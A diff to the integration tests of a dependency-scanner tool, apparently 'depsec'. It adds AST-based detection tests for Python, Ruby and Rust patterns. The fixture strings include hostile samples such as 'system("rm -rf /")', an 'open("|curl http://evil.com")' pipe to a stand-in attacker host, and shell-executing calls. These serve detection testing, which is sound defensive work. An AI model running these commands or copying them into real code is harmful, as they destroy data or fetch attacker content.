@@ -88,16 +88,91 @@ pub fn run_all() -> Vec<VectorResult> {
         ),
         ("P019", "hn-vm-exec", "DEPSEC-P019", Box::new(test_vm_exec)),
         (
-            "P001-py",
+            "P022-py",
             "hn-python-subprocess",
-            "DEPSEC-P001",
+            "DEPSEC-P022",
             Box::new(test_python_subprocess),
         ),
         (
-            "P001-rb",
+            "P030-rb",
             "hn-ruby-system",
-            "DEPSEC-P001",
+            "DEPSEC-P030",
             Box::new(test_ruby_system),
+        ),
+        // Python AST tests
+        (
+            "P024-py",
+            "hn-python-pickle",
+            "DEPSEC-P024",
+            Box::new(test_python_pickle),
+        ),
+        (
+            "P020-py",
+            "hn-python-eval",
+            "DEPSEC-P020",
+            Box::new(test_python_eval),
+        ),
+        (
+            "P023-py",
+            "hn-python-dynimport",
+            "DEPSEC-P023",
+            Box::new(test_python_dynamic_import),
+        ),
+        (
+            "P021-py",
+            "hn-python-subprocess-shell",
+            "DEPSEC-P021",
+            Box::new(test_python_subprocess_shell),
+        ),
+        // Ruby AST tests
+        (
+            "P031-rb",
+            "hn-ruby-shell",
+            "DEPSEC-P031",
+            Box::new(test_ruby_shell_exec),
+        ),
+        (
+            "P032-rb",
+            "hn-ruby-send",
+            "DEPSEC-P032",
+            Box::new(test_ruby_send),
+        ),
+        (
+            "P034-rb",
+            "hn-ruby-pipe-open",
+            "DEPSEC-P034",
+            Box::new(test_ruby_pipe_open),
+        ),
+        (
+            "P033-rb",
+            "hn-ruby-dynrequire",
+            "DEPSEC-P033",
+            Box::new(test_ruby_dynamic_require),
+        ),
+        // Rust AST tests
+        (
+            "P040-rs",
+            "hn-rust-command",
+            "DEPSEC-P040",
+            Box::new(test_rust_command_new),
+        ),
+        (
+            "P041-rs",
+            "hn-rust-unsafe",
+            "DEPSEC-P041",
+            Box::new(test_rust_unsafe),
+        ),
+        (
+            "P042-rs",
+            "hn-rust-ffi",
+            "DEPSEC-P042",
+            Box::new(test_rust_ffi),
+        ),
+        (
+            "P043-rs",
+            "hn-rust-include",
+            "DEPSEC-P043",
+            Box::new(test_rust_include_bytes),
         ),
     ];
 
@@ -286,27 +361,159 @@ fn test_vm_exec() -> bool {
 }
 
 fn test_python_subprocess() -> bool {
-    // Python: exec() with variable input triggers P001 regex
-    // NOTE: Python AST (P021) is NOT triggered by integration scanner because
-    // needs_ast gate only checks JS keywords. This is a known depsec gap tracked
-    // as evasion vector. Here we test the regex fallback.
+    // Python AST: os.system() triggers P022
     scan_detects_pip(
         "hn-python-subprocess",
         "__init__.py",
         "import os\nos.system(cmd)\nexec(malicious_code)",
-        "DEPSEC-P001", // regex catches exec(variable)
+        "DEPSEC-P022", // AST catches os.system()
     )
 }
 
 fn test_ruby_system() -> bool {
-    // Ruby: eval() with variable input triggers P001 regex
-    // NOTE: Ruby AST (P031) is NOT triggered by integration scanner because
-    // needs_ast gate only checks JS keywords. This is a known depsec gap.
+    // Ruby AST: eval() triggers P030
     scan_detects_gem(
         "hn-ruby-system",
         "lib/evil.rb",
         "eval(user_input)",
-        "DEPSEC-P001", // regex catches eval(variable)
+        "DEPSEC-P030", // AST catches eval()
+    )
+}
+
+// --- Python AST detection tests ---
+
+fn test_python_pickle() -> bool {
+    scan_detects_pip(
+        "hn-python-pickle",
+        "__init__.py",
+        "import pickle\nobj = pickle.loads(data)",
+        "DEPSEC-P024",
+    )
+}
+
+fn test_python_eval() -> bool {
+    scan_detects_pip(
+        "hn-python-eval",
+        "__init__.py",
+        "result = eval(user_input)",
+        "DEPSEC-P020",
+    )
+}
+
+fn test_python_dynamic_import() -> bool {
+    scan_detects_pip(
+        "hn-python-dynimport",
+        "__init__.py",
+        "mod = __import__(module_name)",
+        "DEPSEC-P023",
+    )
+}
+
+fn test_python_subprocess_shell() -> bool {
+    scan_detects_pip(
+        "hn-python-subprocess-shell",
+        "__init__.py",
+        "import subprocess\nsubprocess.Popen(cmd, shell=True)",
+        "DEPSEC-P021",
+    )
+}
+
+// --- Ruby AST detection tests ---
+
+fn test_ruby_shell_exec() -> bool {
+    scan_detects_gem(
+        "hn-ruby-shell",
+        "lib/evil.rb",
+        r#"system("rm -rf /")"#,
+        "DEPSEC-P031",
+    )
+}
+
+fn test_ruby_send() -> bool {
+    scan_detects_gem(
+        "hn-ruby-send",
+        "lib/evil.rb",
+        "obj.send(method_name, arg1)",
+        "DEPSEC-P032",
+    )
+}
+
+fn test_ruby_pipe_open() -> bool {
+    scan_detects_gem(
+        "hn-ruby-pipe-open",
+        "lib/evil.rb",
+        r#"open("|curl http://evil.com")"#,
+        "DEPSEC-P034",
+    )
+}
+
+fn test_ruby_dynamic_require() -> bool {
+    scan_detects_gem(
+        "hn-ruby-dynrequire",
+        "lib/evil.rb",
+        "require(plugin_name)",
+        "DEPSEC-P033",
+    )
+}
+
+// --- Rust AST detection tests ---
+
+fn scan_detects_rust(name: &str, file: &str, content: &str, rule_id: &str) -> bool {
+    // Place .rs files inside node_modules/<name>/ so the scanner walks them.
+    // The scanner is language-agnostic — it scans all source extensions in dep dirs.
+    let dir = ScanPackageBuilder::npm(name).file(file, content).build();
+    let output = run_scan(dir.path(), "patterns");
+    output.contains(rule_id)
+}
+
+fn test_rust_command_new() -> bool {
+    scan_detects_rust(
+        "hn-rust-command",
+        "main.rs",
+        r#"
+use std::process::Command;
+fn run() {
+    Command::new("sh").arg("-c").arg(cmd).output().unwrap();
+}
+"#,
+        "DEPSEC-P040",
+    )
+}
+
+fn test_rust_unsafe() -> bool {
+    scan_detects_rust(
+        "hn-rust-unsafe",
+        "main.rs",
+        r#"
+fn danger() {
+    unsafe { std::ptr::read(addr) };
+}
+"#,
+        "DEPSEC-P041",
+    )
+}
+
+fn test_rust_ffi() -> bool {
+    scan_detects_rust(
+        "hn-rust-ffi",
+        "main.rs",
+        r#"
+extern "C" {
+    fn evil_function(ptr: *mut u8);
+}
+"#,
+        "DEPSEC-P042",
+    )
+}
+
+fn test_rust_include_bytes() -> bool {
+    scan_detects_rust(
+        "hn-rust-include",
+        "main.rs",
+        r#"
+const DATA: &[u8] = include_bytes!("payload.bin");
+"#,
+        "DEPSEC-P043",
     )
 }
 
@@ -428,7 +635,7 @@ fn scan_tier_vm_exec() {
 fn scan_tier_python_subprocess() {
     assert!(
         test_python_subprocess(),
-        "P001: exec(variable) in Python should be detected via regex"
+        "P022: os.system() in Python should be detected via AST"
     );
 }
 
@@ -436,6 +643,108 @@ fn scan_tier_python_subprocess() {
 fn scan_tier_ruby_system() {
     assert!(
         test_ruby_system(),
-        "P001: eval(variable) in Ruby should be detected via regex"
+        "P030: eval() in Ruby should be detected via AST"
+    );
+}
+
+// --- Python AST tests ---
+
+#[test]
+fn scan_tier_python_pickle() {
+    assert!(
+        test_python_pickle(),
+        "P024: pickle.loads() in Python should be detected"
+    );
+}
+
+#[test]
+fn scan_tier_python_eval() {
+    assert!(
+        test_python_eval(),
+        "P020: eval(variable) in Python should be detected"
+    );
+}
+
+#[test]
+fn scan_tier_python_dynamic_import() {
+    assert!(
+        test_python_dynamic_import(),
+        "P023: __import__(variable) in Python should be detected"
+    );
+}
+
+#[test]
+fn scan_tier_python_subprocess_shell() {
+    assert!(
+        test_python_subprocess_shell(),
+        "P021: subprocess.Popen(shell=True) in Python should be detected"
+    );
+}
+
+// --- Ruby AST tests ---
+
+#[test]
+fn scan_tier_ruby_shell_exec() {
+    assert!(
+        test_ruby_shell_exec(),
+        "P031: system() in Ruby should be detected"
+    );
+}
+
+#[test]
+fn scan_tier_ruby_send() {
+    assert!(
+        test_ruby_send(),
+        "P032: send(variable) in Ruby should be detected"
+    );
+}
+
+#[test]
+fn scan_tier_ruby_pipe_open() {
+    assert!(
+        test_ruby_pipe_open(),
+        "P034: open(\"|\") in Ruby should be detected"
+    );
+}
+
+#[test]
+fn scan_tier_ruby_dynamic_require() {
+    assert!(
+        test_ruby_dynamic_require(),
+        "P033: require(variable) in Ruby should be detected"
+    );
+}
+
+// --- Rust AST tests ---
+
+#[test]
+fn scan_tier_rust_command_new() {
+    assert!(
+        test_rust_command_new(),
+        "P040: Command::new() in Rust should be detected"
+    );
+}
+
+#[test]
+fn scan_tier_rust_unsafe() {
+    assert!(
+        test_rust_unsafe(),
+        "P041: unsafe block in Rust should be detected"
+    );
+}
+
+#[test]
+fn scan_tier_rust_ffi() {
+    assert!(
+        test_rust_ffi(),
+        "P042: extern \"C\" block in Rust should be detected"
+    );
+}
+
+#[test]
+fn scan_tier_rust_include_bytes() {
+    assert!(
+        test_rust_include_bytes(),
+        "P043: include_bytes!() in Rust should be detected"
     );
 }
